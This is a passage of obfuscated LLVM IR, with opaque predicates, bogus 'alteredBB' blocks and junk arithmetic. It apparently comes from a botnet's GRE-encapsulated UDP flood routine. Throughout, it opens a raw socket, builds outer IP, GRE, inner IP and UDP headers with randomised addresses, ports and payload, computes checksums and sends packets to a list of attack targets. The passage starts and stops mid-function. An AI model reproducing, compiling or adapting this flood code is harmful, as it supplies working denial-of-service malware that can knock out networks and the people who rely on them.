  %325 = load i32, i32* @y.20
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %323
  %332 = load i32, i32* %17, align 4
  %333 = load i8, i8* %13, align 1
  %334 = zext i8 %333 to i32
  %335 = icmp slt i32 %332, %334
  %336 = load i32, i32* @x.19
  %337 = load i32, i32* @y.20
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %335, label %344, label %624

; <label>:344:                                    ; preds = %originalBBpart270
  %345 = load i32, i32* @x.19
  %346 = load i32, i32* @y.20
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %344
  %353 = load i8**, i8*** %19, align 8
  %354 = load i32, i32* %17, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds i8*, i8** %353, i64 %355
  %357 = load i8*, i8** %356, align 8
  store i8* %357, i8** %34, align 8
  %358 = load i8*, i8** %34, align 8
  %359 = bitcast i8* %358 to %struct.iphdr*
  store %struct.iphdr* %359, %struct.iphdr** %35, align 8
  %360 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %361 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %360, i64 1
  %362 = bitcast %struct.iphdr* %361 to %struct.grehdr*
  store %struct.grehdr* %362, %struct.grehdr** %36, align 8
  %363 = load %struct.grehdr*, %struct.grehdr** %36, align 8
  %364 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %363, i64 1
  %365 = bitcast %struct.grehdr* %364 to %struct.iphdr*
  store %struct.iphdr* %365, %struct.iphdr** %37, align 8
  %366 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i64 1
  %368 = bitcast %struct.iphdr* %367 to %struct.udphdr*
  store %struct.udphdr* %368, %struct.udphdr** %38, align 8
  %369 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %370 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %369, i64 1
  %371 = bitcast %struct.udphdr* %370 to i8*
  store i8* %371, i8** %39, align 8
  %372 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %373 = load i32, i32* %17, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %372, i64 %374
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %375, i32 0, i32 2
  %377 = load i8, i8* %376, align 4
  %378 = zext i8 %377 to i32
  %379 = icmp slt i32 %378, 32
  %380 = load i32, i32* @x.19
  %381 = load i32, i32* @y.20
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br i1 %379, label %388, label %425

; <label>:388:                                    ; preds = %originalBBpart274
  %389 = load i32, i32* @x.19
  %390 = load i32, i32* @y.20
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %388
  %397 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %398 = load i32, i32* %17, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %397, i64 %399
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %400, i32 0, i32 1
  %402 = load i32, i32* %401, align 4
  %403 = call i32 @ntohl(i32 %402) #7
  %404 = call i32 @rand_next()
  %405 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %406 = load i32, i32* %17, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %405, i64 %407
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i32 0, i32 2
  %410 = load i8, i8* %409, align 4
  %411 = zext i8 %410 to i32
  %412 = lshr i32 %404, %411
  %413 = add i32 %403, %412
  %414 = call i32 @htonl(i32 %413) #7
  %415 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i32 0, i32 9
  store i32 %414, i32* %416, align 4
  %417 = load i32, i32* @x.19
  %418 = load i32, i32* @y.20
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBBpart290, label %originalBB76alteredBB

originalBBpart290:                                ; preds = %originalBB76
  br label %425

; <label>:425:                                    ; preds = %originalBBpart290, %originalBBpart274
  %426 = load i32, i32* %29, align 4
  %427 = icmp eq i32 %426, -1
  br i1 %427, label %428, label %432

; <label>:428:                                    ; preds = %425
  %429 = call i32 @rand_next()
  %430 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 8
  store i32 %429, i32* %431, align 4
  br label %432

; <label>:432:                                    ; preds = %428, %425
  %433 = load i16, i16* %21, align 2
  %434 = zext i16 %433 to i32
  %435 = icmp eq i32 %434, 65535
  br i1 %435, label %436, label %467

; <label>:436:                                    ; preds = %432
  %437 = load i32, i32* @x.19
  %438 = load i32, i32* @y.20
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %436
  %445 = call i32 @rand_next()
  %446 = and i32 %445, 65535
  %447 = trunc i32 %446 to i16
  %448 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %449 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %448, i32 0, i32 3
  store i16 %447, i16* %449, align 4
  %450 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %451 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %450, i32 0, i32 3
  %452 = load i16, i16* %451, align 4
  %453 = zext i16 %452 to i32
  %454 = sub nsw i32 %453, 1000
  %455 = xor i32 %454, -1
  %456 = trunc i32 %455 to i16
  %457 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %458 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %457, i32 0, i32 3
  store i16 %456, i16* %458, align 4
  %459 = load i32, i32* @x.19
  %460 = load i32, i32* @y.20
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBBpart299, label %originalBB92alteredBB

originalBBpart299:                                ; preds = %originalBB92
  br label %467

; <label>:467:                                    ; preds = %originalBBpart299, %432
  %468 = load i16, i16* %24, align 2
  %469 = zext i16 %468 to i32
  %470 = icmp eq i32 %469, 65535
  br i1 %470, label %471, label %477

; <label>:471:                                    ; preds = %467
  %472 = call i32 @rand_next()
  %473 = and i32 %472, 65535
  %474 = trunc i32 %473 to i16
  %475 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %476 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %475, i32 0, i32 0
  store i16 %474, i16* %476, align 2
  br label %477

; <label>:477:                                    ; preds = %471, %467
  %478 = load i16, i16* %25, align 2
  %479 = zext i16 %478 to i32
  %480 = icmp eq i32 %479, 65535
  br i1 %480, label %481, label %487

; <label>:481:                                    ; preds = %477
  %482 = call i32 @rand_next()
  %483 = and i32 %482, 65535
  %484 = trunc i32 %483 to i16
  %485 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %486 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %485, i32 0, i32 1
  store i16 %484, i16* %486, align 2
  br label %487

; <label>:487:                                    ; preds = %481, %477
  %488 = load i8, i8* %28, align 1
  %489 = icmp ne i8 %488, 0
  br i1 %489, label %494, label %490

; <label>:490:                                    ; preds = %487
  %491 = call i32 @rand_next()
  %492 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 9
  store i32 %491, i32* %493, align 4
  br label %516

; <label>:494:                                    ; preds = %487
  %495 = load i32, i32* @x.19
  %496 = load i32, i32* @y.20
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %494
  %503 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %504 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %503, i32 0, i32 9
  %505 = load i32, i32* %504, align 4
  %506 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 9
  store i32 %505, i32* %507, align 4
  %508 = load i32, i32* @x.19
  %509 = load i32, i32* @y.20
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br label %516

; <label>:516:                                    ; preds = %originalBBpart2103, %490
  %517 = load i8, i8* %27, align 1
  %518 = icmp ne i8 %517, 0
  br i1 %518, label %519, label %538

; <label>:519:                                    ; preds = %516
  %520 = load i32, i32* @x.19
  %521 = load i32, i32* @y.20
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %519
  %528 = load i8*, i8** %39, align 8
  %529 = load i32, i32* %26, align 4
  call void @rand_str(i8* %528, i32 %529)
  %530 = load i32, i32* @x.19
  %531 = load i32, i32* @y.20
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %538

; <label>:538:                                    ; preds = %originalBBpart2107, %516
  %539 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 7
  store i16 0, i16* %540, align 2
  %541 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %542 = bitcast %struct.iphdr* %541 to i16*
  %543 = call zeroext i16 @checksum_generic(i16* %542, i32 20)
  %544 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %545 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %544, i32 0, i32 7
  store i16 %543, i16* %545, align 2
  %546 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %547 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %546, i32 0, i32 7
  store i16 0, i16* %547, align 2
  %548 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %549 = bitcast %struct.iphdr* %548 to i16*
  %550 = call zeroext i16 @checksum_generic(i16* %549, i32 20)
  %551 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 %550, i16* %552, align 2
  %553 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %554 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %553, i32 0, i32 3
  store i16 0, i16* %554, align 2
  %555 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %556 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %557 = bitcast %struct.udphdr* %556 to i8*
  %558 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %559 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %558, i32 0, i32 2
  %560 = load i16, i16* %559, align 2
  %561 = load i32, i32* %26, align 4
  %562 = sext i32 %561 to i64
  %563 = add i64 8, %562
  %564 = trunc i64 %563 to i32
  %565 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %555, i8* %557, i16 zeroext %560, i32 %564)
  %566 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %567 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %566, i32 0, i32 3
  store i16 %565, i16* %567, align 2
  %568 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %569 = load i32, i32* %17, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i64 %570
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i32 0, i32 0
  %573 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %572, i32 0, i32 0
  store i16 2, i16* %573, align 4
  %574 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 9
  %576 = load i32, i32* %575, align 4
  %577 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %578 = load i32, i32* %17, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %577, i64 %579
  %581 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %580, i32 0, i32 0
  %582 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %581, i32 0, i32 2
  %583 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %582, i32 0, i32 0
  store i32 %576, i32* %583, align 4
  %584 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %585 = load i32, i32* %17, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i64 %586
  %588 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i32 0, i32 0
  %589 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %588, i32 0, i32 1
  store i16 0, i16* %589, align 2
  %590 = load i32, i32* %18, align 4
  %591 = load i8*, i8** %34, align 8
  %592 = load i32, i32* %26, align 4
  %593 = sext i32 %592 to i64
  %594 = add i64 52, %593
  %595 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %596 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %597 = load i32, i32* %17, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i64 %598
  %600 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i32 0, i32 0
  %601 = bitcast %struct.sockaddr_in* %600 to %struct.sockaddr*
  store %struct.sockaddr* %601, %struct.sockaddr** %595, align 8
  %602 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %603 = load %struct.sockaddr*, %struct.sockaddr** %602, align 8
  %604 = call i64 @sendto(i32 %590, i8* %591, i64 %594, i32 16384, %struct.sockaddr* %603, i32 16)
  br label %605

; <label>:605:                                    ; preds = %538
  %606 = load i32, i32* @x.19
  %607 = load i32, i32* @y.20
  %608 = sub i32 %606, 1
  %609 = mul i32 %606, %608
  %610 = urem i32 %609, 2
  %611 = icmp eq i32 %610, 0
  %612 = icmp slt i32 %607, 10
  %613 = or i1 %611, %612
  br i1 %613, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %605
  %614 = load i32, i32* %17, align 4
  %615 = add nsw i32 %614, 1
  store i32 %615, i32* %17, align 4
  %616 = load i32, i32* @x.19
  %617 = load i32, i32* @y.20
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart2126, label %originalBB109alteredBB

originalBBpart2126:                               ; preds = %originalBB109
  br label %323

; <label>:624:                                    ; preds = %originalBBpart270
  br label %322

; <label>:625:                                    ; preds = %100, %94
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %626 = alloca i8, align 1
  %627 = alloca %struct.attack_target*, align 8
  %628 = alloca i8, align 1
  %629 = alloca %struct.attack_option*, align 8
  %630 = alloca i32, align 4
  %631 = alloca i32, align 4
  %632 = alloca i8**, align 8
  %633 = alloca i8, align 1
  %634 = alloca i16, align 2
  %635 = alloca i8, align 1
  %636 = alloca i8, align 1
  %637 = alloca i16, align 2
  %638 = alloca i16, align 2
  %639 = alloca i32, align 4
  %640 = alloca i8, align 1
  %641 = alloca i8, align 1
  %642 = alloca i32, align 4
  %643 = alloca %struct.iphdr*, align 8
  %644 = alloca %struct.grehdr*, align 8
  %645 = alloca %struct.iphdr*, align 8
  %646 = alloca %struct.udphdr*, align 8
  %647 = alloca i8*, align 8
  %648 = alloca %struct.iphdr*, align 8
  %649 = alloca %struct.grehdr*, align 8
  %650 = alloca %struct.iphdr*, align 8
  %651 = alloca %struct.udphdr*, align 8
  %652 = alloca i8*, align 8
  %653 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %626, align 1
  store %struct.attack_target* %1, %struct.attack_target** %627, align 8
  store i8 %2, i8* %628, align 1
  store %struct.attack_option* %3, %struct.attack_option** %629, align 8
  %654 = load i8, i8* %626, align 1
  %655 = zext i8 %654 to i64
  %656 = call noalias i8* @calloc(i64 %655, i64 8) #6
  %657 = bitcast i8* %656 to i8**
  store i8** %657, i8*** %632, align 8
  %658 = load i8, i8* %628, align 1
  %659 = load %struct.attack_option*, %struct.attack_option** %629, align 8
  %660 = call i32 @attack_get_opt_int(i8 zeroext %658, %struct.attack_option* %659, i8 zeroext 2, i32 0)
  %661 = trunc i32 %660 to i8
  store i8 %661, i8* %633, align 1
  %662 = load i8, i8* %628, align 1
  %663 = load %struct.attack_option*, %struct.attack_option** %629, align 8
  %664 = call i32 @attack_get_opt_int(i8 zeroext %662, %struct.attack_option* %663, i8 zeroext 3, i32 65535)
  %665 = trunc i32 %664 to i16
  store i16 %665, i16* %634, align 2
  %666 = load i8, i8* %628, align 1
  %667 = load %struct.attack_option*, %struct.attack_option** %629, align 8
  %668 = call i32 @attack_get_opt_int(i8 zeroext %666, %struct.attack_option* %667, i8 zeroext 4, i32 64)
  %669 = trunc i32 %668 to i8
  store i8 %669, i8* %635, align 1
  %670 = load i8, i8* %628, align 1
  %671 = load %struct.attack_option*, %struct.attack_option** %629, align 8
  %672 = call i32 @attack_get_opt_int(i8 zeroext %670, %struct.attack_option* %671, i8 zeroext 5, i32 1)
  %673 = trunc i32 %672 to i8
  store i8 %673, i8* %636, align 1
  %674 = load i8, i8* %628, align 1
  %675 = load %struct.attack_option*, %struct.attack_option** %629, align 8
  %676 = call i32 @attack_get_opt_int(i8 zeroext %674, %struct.attack_option* %675, i8 zeroext 6, i32 65535)
  %677 = trunc i32 %676 to i16
  store i16 %677, i16* %637, align 2
  %678 = load i8, i8* %628, align 1
  %679 = load %struct.attack_option*, %struct.attack_option** %629, align 8
  %680 = call i32 @attack_get_opt_int(i8 zeroext %678, %struct.attack_option* %679, i8 zeroext 7, i32 65535)
  %681 = trunc i32 %680 to i16
  store i16 %681, i16* %638, align 2
  %682 = load i8, i8* %628, align 1
  %683 = load %struct.attack_option*, %struct.attack_option** %629, align 8
  %684 = call i32 @attack_get_opt_int(i8 zeroext %682, %struct.attack_option* %683, i8 zeroext 0, i32 512)
  store i32 %684, i32* %639, align 4
  %685 = load i8, i8* %628, align 1
  %686 = load %struct.attack_option*, %struct.attack_option** %629, align 8
  %687 = call i32 @attack_get_opt_int(i8 zeroext %685, %struct.attack_option* %686, i8 zeroext 1, i32 1)
  %688 = trunc i32 %687 to i8
  store i8 %688, i8* %640, align 1
  %689 = load i8, i8* %628, align 1
  %690 = load %struct.attack_option*, %struct.attack_option** %629, align 8
  %691 = call i32 @attack_get_opt_int(i8 zeroext %689, %struct.attack_option* %690, i8 zeroext 19, i32 0)
  %692 = trunc i32 %691 to i8
  store i8 %692, i8* %641, align 1
  %693 = load i8, i8* %628, align 1
  %694 = load %struct.attack_option*, %struct.attack_option** %629, align 8
  %695 = load i32, i32* @LOCAL_ADDR, align 4
  %696 = call i32 @attack_get_opt_int(i8 zeroext %693, %struct.attack_option* %694, i8 zeroext 25, i32 %695)
  store i32 %696, i32* %642, align 4
  %697 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %697, i32* %631, align 4
  %698 = icmp eq i32 %697, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %163
  %699 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %700 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %699, i32 0, i32 6
  store i8 47, i8* %700, align 1
  %701 = load i32, i32* %29, align 4
  %702 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %703 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %702, i32 0, i32 8
  store i32 %701, i32* %703, align 4
  %704 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %705 = load i32, i32* %17, align 4
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %704, i64 %706
  %708 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %707, i32 0, i32 1
  %709 = load i32, i32* %708, align 4
  %710 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %711 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %710, i32 0, i32 9
  store i32 %709, i32* %711, align 4
  %712 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %713 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %714 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %713, i32 0, i32 1
  store i16 %712, i16* %714, align 2
  %715 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %716 = bitcast %struct.iphdr* %715 to i8*
  %717 = load i8, i8* %716, align 4
  %_ = shl i8 %717, 15
  %_2 = shl i8 %717, 15
  %_3 = sub i8 %717, 15
  %gen = mul i8 %_3, 15
  %718 = and i8 %717, 15
  %_4 = sub i8 %718, 64
  %gen5 = mul i8 %_4, 64
  %719 = or i8 %718, 64
  store i8 %719, i8* %716, align 4
  %720 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %721 = bitcast %struct.iphdr* %720 to i8*
  %722 = load i8, i8* %721, align 4
  %_6 = sub i8 0, %722
  %gen7 = add i8 %_6, -16
  %_8 = shl i8 %722, -16
  %_9 = sub i8 0, %722
  %gen10 = add i8 %_9, -16
  %723 = and i8 %722, -16
  %_11 = shl i8 %723, 5
  %_12 = shl i8 %723, 5
  %_13 = sub i8 %723, 5
  %gen14 = mul i8 %_13, 5
  %_15 = sub i8 %723, 5
  %gen16 = mul i8 %_15, 5
  %_17 = sub i8 0, %723
  %gen18 = add i8 %_17, 5
  %_19 = sub i8 %723, 5
  %gen20 = mul i8 %_19, 5
  %_21 = sub i8 0, %723
  %gen22 = add i8 %_21, 5
  %724 = or i8 %723, 5
  store i8 %724, i8* %721, align 4
  %725 = load i8, i8* %20, align 1
  %726 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %727 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %726, i32 0, i32 1
  store i8 %725, i8* %727, align 1
  %728 = load i32, i32* %26, align 4
  %729 = sext i32 %728 to i64
  %_23 = sub i64 28, %729
  %gen24 = mul i64 %_23, %729
  %_25 = sub i64 28, %729
  %gen26 = mul i64 %_25, %729
  %_27 = sub i64 0, 28
  %gen28 = add i64 %_27, %729
  %_29 = shl i64 28, %729
  %_30 = sub i64 0, 28
  %gen31 = add i64 %_30, %729
  %_32 = shl i64 28, %729
  %_33 = sub i64 28, %729
  %gen34 = mul i64 %_33, %729
  %_35 = sub i64 0, 28
  %gen36 = add i64 %_35, %729
  %_37 = shl i64 28, %729
  %730 = add i64 28, %729
  %731 = trunc i64 %730 to i16
  %732 = call zeroext i16 @htons(i16 zeroext %731) #7
  %733 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %734 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %733, i32 0, i32 2
  store i16 %732, i16* %734, align 2
  %735 = load i16, i16* %21, align 2
  %736 = zext i16 %735 to i32
  %_38 = sub i32 0, %736
  %gen39 = add i32 %_38, -1
  %_40 = sub i32 %736, -1
  %gen41 = mul i32 %_40, -1
  %737 = xor i32 %736, -1
  %738 = trunc i32 %737 to i16
  %739 = call zeroext i16 @htons(i16 zeroext %738) #7
  %740 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %741 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %740, i32 0, i32 3
  store i16 %739, i16* %741, align 4
  %742 = load i8, i8* %22, align 1
  %743 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %744 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %743, i32 0, i32 5
  store i8 %742, i8* %744, align 4
  %745 = load i8, i8* %23, align 1
  %746 = icmp ne i8 %745, 0
  br label %originalBB1

originalBB45alteredBB:                            ; preds = %originalBB45, %240
  %747 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %748 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %747, i32 0, i32 9
  %749 = load i32, i32* %748, align 4
  %750 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %751 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %750, i32 0, i32 9
  store i32 %749, i32* %751, align 4
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %270
  %752 = load i16, i16* %24, align 2
  %753 = call zeroext i16 @htons(i16 zeroext %752) #7
  %754 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %755 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %754, i32 0, i32 0
  store i16 %753, i16* %755, align 2
  %756 = load i16, i16* %25, align 2
  %757 = call zeroext i16 @htons(i16 zeroext %756) #7
  %758 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %759 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %758, i32 0, i32 1
  store i16 %757, i16* %759, align 2
  %760 = load i32, i32* %26, align 4
  %761 = sext i32 %760 to i64
  %_50 = sub i64 0, 8
  %gen51 = add i64 %_50, %761
  %_52 = sub i64 0, 8
  %gen53 = add i64 %_52, %761
  %762 = add i64 8, %761
  %763 = trunc i64 %762 to i16
  %764 = call zeroext i16 @htons(i16 zeroext %763) #7
  %765 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %766 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %765, i32 0, i32 2
  store i16 %764, i16* %766, align 2
  br label %originalBB49

originalBB57alteredBB:                            ; preds = %originalBB57, %302
  %767 = load i32, i32* %17, align 4
  %_58 = shl i32 %767, 1
  %_59 = sub i32 %767, 1
  %gen60 = mul i32 %_59, 1
  %_61 = sub i32 %767, 1
  %gen62 = mul i32 %_61, 1
  %_63 = sub i32 %767, 1
  %gen64 = mul i32 %_63, 1
  %768 = add nsw i32 %767, 1
  store i32 %768, i32* %17, align 4
  br label %originalBB57

originalBB68alteredBB:                            ; preds = %originalBB68, %323
  %769 = load i32, i32* %17, align 4
  %770 = load i8, i8* %13, align 1
  %771 = zext i8 %770 to i32
  %772 = icmp slt i32 %769, %771
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %344
  %773 = load i8**, i8*** %19, align 8
  %774 = load i32, i32* %17, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds i8*, i8** %773, i64 %775
  %777 = load i8*, i8** %776, align 8
  store i8* %777, i8** %34, align 8
  %778 = load i8*, i8** %34, align 8
  %779 = bitcast i8* %778 to %struct.iphdr*
  store %struct.iphdr* %779, %struct.iphdr** %35, align 8
  %780 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %781 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %780, i64 1
  %782 = bitcast %struct.iphdr* %781 to %struct.grehdr*
  store %struct.grehdr* %782, %struct.grehdr** %36, align 8
  %783 = load %struct.grehdr*, %struct.grehdr** %36, align 8
  %784 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %783, i64 1
  %785 = bitcast %struct.grehdr* %784 to %struct.iphdr*
  store %struct.iphdr* %785, %struct.iphdr** %37, align 8
  %786 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %787 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %786, i64 1
  %788 = bitcast %struct.iphdr* %787 to %struct.udphdr*
